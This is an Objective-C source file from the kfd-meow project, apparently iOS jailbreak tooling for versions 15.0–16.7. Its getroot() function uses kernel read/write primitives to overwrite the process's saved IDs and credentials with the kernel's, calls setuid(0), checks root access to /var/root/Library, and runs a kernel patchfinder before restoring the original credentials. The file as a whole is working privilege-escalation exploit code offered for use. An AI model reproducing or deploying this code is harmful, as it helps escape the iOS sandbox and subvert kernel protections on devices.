//
//  meow.m
//  kfd-meow
//
//  Created by mizole on 2024/02/04.
//

#import <Foundation/Foundation.h>
#include "meow.h"
#include "kfd_meow-Swift.h"

/*
 #========= PROGRESS =========
 # kcall:    arm64  15.0 - 16.7
 #           arm64e
 # unsandbx: arm64
 #           arm64e
 #============================
 */

void getroot(void) {
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    proc_set_svuid(our_proc, 0);
    proc_set_svgid(our_proc, 0);
    proc_set_ucred(our_proc, kern_ucred);
    setuid(0);
    
    printf("getuid() : %d\n", getuid());
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    Fugu15KPF();
    
    proc_set_svuid(our_proc, 501);
    proc_set_svgid(our_proc, 501);
    proc_set_ucred(our_proc, our_ucred);
    setuid(501);
}

/*---- meow ----*/
int meow(void) {
    set_offsets();
    usleep(5000);
    init_kcall(true);
    usleep(5000);
    getroot();
    init_kcall(false);
    return 0;
}
